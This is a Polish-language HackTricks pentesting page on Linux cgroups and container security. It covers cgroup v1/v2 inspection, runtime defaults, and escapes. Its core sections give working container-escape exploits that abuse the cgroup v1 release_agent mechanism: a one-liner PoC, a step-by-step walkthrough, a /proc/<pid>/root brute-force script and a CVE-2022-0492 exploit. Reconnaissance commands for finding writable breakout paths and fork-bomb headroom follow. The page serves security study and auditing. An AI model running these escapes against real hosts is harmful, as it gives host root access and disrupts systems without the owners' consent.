# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Przegląd

Linuxowe **control groups** są mechanizmem jądra używanym do grupowania procesów dla celów rozliczania, ograniczania, priorytetyzacji i egzekwowania polityk. Jeśli namespaces dotyczą głównie izolowania widoku zasobów, cgroups dotyczą przede wszystkim regulowania **ile** tych zasobów zestaw procesów może zużyć oraz, w niektórych przypadkach, **z którymi klasami zasobów** w ogóle mogą wchodzić w interakcje. Containers polegają na cgroups nieustannie, nawet jeśli użytkownik nigdy nie patrzy na nie bezpośrednio, ponieważ niemal każde współczesne runtime potrzebuje sposobu, by powiedzieć jądru „te procesy należą do tego workloadu, i to są reguły zasobów, które się do nich odnoszą”.

To dlatego silniki kontenerów umieszczają nowy container w jego własnym poddrzewie cgroup. Gdy drzewo procesów jest tam umieszczone, runtime może ograniczyć pamięć, limitować liczbę PIDs, ustalać wagę użycia CPU, regulować I/O oraz ograniczać dostęp do urządzeń. W środowisku produkcyjnym jest to niezbędne zarówno dla bezpieczeństwa multi-tenant, jak i dla podstawowej higieny operacyjnej. Container bez sensownych kontroli zasobów może wyczerpać pamięć, zalać system procesami lub zmonopolizować CPU i I/O w sposób powodujący niestabilność hosta lub sąsiednich workloadów.

Z perspektywy bezpieczeństwa cgroups mają znaczenie na dwa sposoby. Po pierwsze, złe lub brakujące limity zasobów umożliwiają proste ataki denial-of-service. Po drugie, niektóre funkcje cgroup, szczególnie w starszych konfiguracjach **cgroup v1**, historycznie tworzyły potężne prymitywy breakout, gdy były zapisywalne z wnętrza containera.

## v1 kontra v2

Istnieją dwa główne modele cgroup w użyciu. **cgroup v1** udostępnia wiele hierarchii kontrolerów, a starsze opisy exploitów często dotyczą dziwnych i czasem nadmiernie potężnych semantyk dostępnych tam. **cgroup v2** wprowadza bardziej zunifikowaną hierarchię i generalnie czystsze zachowanie. Nowoczesne dystrybucje coraz częściej preferują cgroup v2, ale wciąż istnieją mieszane lub legacy środowiska, co oznacza, że oba modele są nadal istotne przy analizie rzeczywistych systemów.

Różnica ma znaczenie, ponieważ niektóre z najsłynniejszych historii o breakoutach z kontenerów, takie jak nadużycia **`release_agent`** w cgroup v1, są ściśle powiązane ze starszym zachowaniem cgroup. Czytelnik, który zobaczy exploit cgroup na blogu i następnie bezrefleksyjnie zastosuje go na nowoczesnym systemie działającym wyłącznie na cgroup v2, prawdopodobnie nie zrozumie, co jest faktycznie możliwe na docelowym systemie.

## Inspekcja

Najszybszy sposób, aby sprawdzić, w którym cgroup znajduje się twoja aktualna powłoka, to:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Plik `/proc/self/cgroup` pokazuje ścieżki cgroup powiązane z bieżącym procesem. Na nowoczesnym hoście cgroup v2 często zobaczysz pojedynczy wpis. Na starszych lub hybrydowych hostach możesz zobaczyć wiele ścieżek kontrolerów v1. Gdy poznasz ścieżkę, możesz sprawdzić odpowiadające pliki w katalogu `/sys/fs/cgroup`, aby zobaczyć limity i bieżące użycie.

Na hoście cgroup v2 następujące polecenia są przydatne:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Te pliki ujawniają, które kontrolery istnieją i które z nich są delegowane do podrzędnych cgroups. Ten model delegowania ma znaczenie w środowiskach rootless i zarządzanych przez systemd, gdzie runtime może kontrolować tylko podzbiór funkcji cgroup, który faktycznie deleguje hierarchia nadrzędna.

## Lab

Jednym ze sposobów obserwacji cgroups w praktyce jest uruchomienie kontenera z ograniczeniem pamięci:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Możesz też spróbować kontenera z ograniczeniem PID:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Te przykłady są przydatne, ponieważ pomagają powiązać flagę runtime z interfejsem plikowym jądra. Runtime nie egzekwuje reguły magicznie; zapisuje odpowiednie ustawienia cgroup, a następnie pozwala jądru egzekwować je wobec drzewa procesów.

## Użycie runtime

Docker, Podman, containerd i CRI-O wszystkie polegają na cgroups jako części normalnej pracy. Różnice zwykle nie dotyczą tego, czy używają cgroups, lecz **jakie domyślne ustawienia wybierają**, **jak integrują się z systemd**, **jak działa rootless delegation**, oraz **jak duża część konfiguracji jest kontrolowana na poziomie engine versus na poziomie orkiestracji**.

W Kubernetes, resource requests i limits ostatecznie stają się konfiguracją cgroup na węźle. Ścieżka od Pod YAML do egzekwowania przez jądro przechodzi przez kubelet, CRI runtime i OCI runtime, ale cgroups są nadal mechanizmem jądra, który finalnie stosuje regułę. W środowiskach Incus/LXC cgroups są również szeroko stosowane, zwłaszcza ponieważ system containers często odsłaniają bogatsze drzewo procesów i bardziej VM-podobne oczekiwania operacyjne.

## Błędne konfiguracje i ucieczki

Klasyczna historia bezpieczeństwa cgroup to zapisywalny mechanizm cgroup v1 `release_agent`. W tym modelu, jeśli atakujący może zapisać do odpowiednich plików cgroup, włączyć `notify_on_release` i kontrolować ścieżkę zapisaną w `release_agent`, jądro może ostatecznie wykonać ścieżkę wybraną przez atakującego w initial namespaces na hoście, gdy cgroup stanie się pusta. Dlatego starsze opracowania przywiązują tak dużą wagę do zapisywalności kontrolerów cgroup, opcji montowania oraz warunków namespace/capability.

Nawet gdy `release_agent` nie jest dostępny, błędy w konfiguracji cgroup wciąż mają znaczenie. Zbyt szeroki dostęp do urządzeń może uczynić urządzenia hosta osiągalnymi z kontenera. Brak limitów pamięci i PID może przekształcić proste wykonanie kodu w DoS hosta. Słaba delegacja cgroup w scenariuszach rootless może także wprowadzić obrońców w błąd, skłaniając ich do założenia istnienia ograniczenia, gdy runtime nigdy nie był faktycznie w stanie go zastosować.

### `release_agent` — tło

Technika `release_agent` ma zastosowanie tylko do **cgroup v1**. Podstawowy pomysł jest taki, że gdy ostatni proces w cgroup kończy działanie i ustawione jest `notify_on_release=1`, jądro wykonuje program, którego ścieżka jest przechowywana w `release_agent`. To wykonanie następuje w **initial namespaces na hoście**, co czyni zapisywalny `release_agent` prymitywem ucieczki z kontenera.

Aby technika zadziałała, atakujący zazwyczaj potrzebuje:

- zapisywalnej hierarchii **cgroup v1**
- możliwości utworzenia lub użycia child cgroup
- możliwości ustawienia `notify_on_release`
- możliwości zapisania ścieżki do `release_agent`
- ścieżki, która z punktu widzenia hosta rozwiązuje się do wykonywalnego pliku

### Klasyczny PoC

Historyczny jednowierszowy PoC wygląda tak:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Ten PoC zapisuje ścieżkę payloadu do `release_agent`, wywołuje release cgroup, a następnie odczytuje plik wyjściowy wygenerowany na hoście.

### Czytelny przewodnik

Ten sam pomysł łatwiej zrozumieć, gdy zostanie rozbity na kroki.

1. Utwórz i przygotuj zapisywalny cgroup:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Zidentyfikuj ścieżkę hosta odpowiadającą container filesystem:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Zrzuć payload, który będzie widoczny ze ścieżki hosta:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Wyzwól wykonanie, opróżniając cgroup:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Efekt to wykonanie po stronie hosta payloadu z uprawnieniami root hosta. W rzeczywistym exploicie payload zazwyczaj zapisuje proof file, uruchamia reverse shell lub modyfikuje stan hosta.

### Wariant ścieżki względnej używający `/proc/<pid>/root`

W niektórych środowiskach ścieżka hosta do systemu plików containera nie jest oczywista lub jest ukryta przez storage driver. W takim przypadku ścieżkę payloadu można wyrazić przez `/proc/<pid>/root/...`, gdzie `<pid>` to host PID należący do procesu w aktualnym containerze. To jest podstawa relative-path brute-force variant:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
The relevant trick here is not the brute force itself but the path form: `/proc/<pid>/root/...` lets the kernel resolve a file inside the container filesystem from the host namespace, even when the direct host storage path is not known ahead of time.

### CVE-2022-0492 Wariant

W 2022 roku CVE-2022-0492 wykazał, że zapis do `release_agent` w cgroup v1 nie sprawdzał prawidłowo `CAP_SYS_ADMIN` w **początkowej** przestrzeni nazw użytkownika. Sprawiło to, że technika była znacznie łatwiej osiągalna na podatnych jądrach, ponieważ proces w kontenerze, który potrafił zamontować hierarchię cgroup, mógł zapisać do `release_agent` bez uprzedniego posiadania uprzywilejowań w przestrzeni nazw użytkownika hosta.

Minimal exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Na podatnym jądrze host wykonuje `/proc/self/exe` z uprawnieniami roota hosta.

Dla praktycznego nadużycia zacznij od sprawdzenia, czy środowisko nadal ujawnia zapisywalne ścieżki cgroup-v1 lub niebezpieczny dostęp do urządzeń:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Jeśli `release_agent` jest obecny i zapisywalny, jesteś już w strefie legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Jeżeli sam cgroup path nie pozwala na escape, następnym praktycznym zastosowaniem jest często denial of service lub reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Te polecenia szybko pokażą, czy workload ma miejsce na fork-bomb, czy może agresywnie zużywać pamięć, lub nadużywać zapisywalnego, przestarzałego interfejsu cgroup.

## Sprawdzenia

Podczas przeglądu celu, celem sprawdzeń cgroup jest ustalenie, który model cgroup jest używany, czy kontener widzi zapisywalne ścieżki kontrolerów oraz czy stare breakout primitives takie jak `release_agent` w ogóle mają znaczenie.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Co jest tu interesujące:

- Jeśli `mount | grep cgroup` pokaże **cgroup v1**, starsze breakout writeups stają się bardziej istotne.
- Jeśli `release_agent` istnieje i jest osiągalny, warto to od razu zbadać głębiej.
- Jeśli widoczna hierarchia cgroup jest zapisywalna, a kontener ma też silne capabilities, środowisko wymaga znacznie dokładniejszej analizy.

Jeśli odkryjesz **cgroup v1**, zapisywalne mounty kontrolerów oraz kontener, który dodatkowo ma silne capabilities lub słabą ochronę seccomp/AppArmor, taka kombinacja zasługuje na szczególną uwagę. cgroups są często traktowane jako nudny temat zarządzania zasobami, ale historycznie były częścią jednych z najbardziej pouczających container escape chains — właśnie dlatego, że granica między „kontrolą zasobów” a „wpływem na hosta” nie zawsze była tak wyraźna, jak ludzie zakładali.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Włączone domyślnie | Kontenery są automatycznie umieszczane w cgroups; limity zasobów są opcjonalne, chyba że ustawione za pomocą flag | pomijanie `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Włączone domyślnie | `--cgroups=enabled` jest domyślne; domyślne ustawienia namespace cgroup zależą od wersji cgroup (`private` on cgroup v2, `host` on some cgroup v1 setups) | `--cgroups=disabled`, `--cgroupns=host`, poluzowany dostęp do urządzeń, `--privileged` |
| Kubernetes | Włączone przez runtime domyślnie | Pody i kontenery są umieszczane w cgroups przez runtime węzła; szczegółowa kontrola zasobów zależy od `resources.requests` / `resources.limits` | pomijanie żądań/limitów zasobów, uprzywilejowany dostęp do urządzeń, nieprawidłowa konfiguracja runtime na poziomie hosta |
| containerd / CRI-O | Włączone domyślnie | cgroups są częścią normalnego zarządzania cyklem życia | bezpośrednie konfiguracje runtime, które poluzowują kontrolę urządzeń lub ujawniają przestarzałe zapisywalne interfejsy cgroup v1 |

Ważne rozróżnienie polega na tym, że **istnienie cgroup** jest zazwyczaj domyślne, natomiast **przydatne ograniczenia zasobów** są często opcjonalne, chyba że zostaną wyraźnie skonfigurowane.
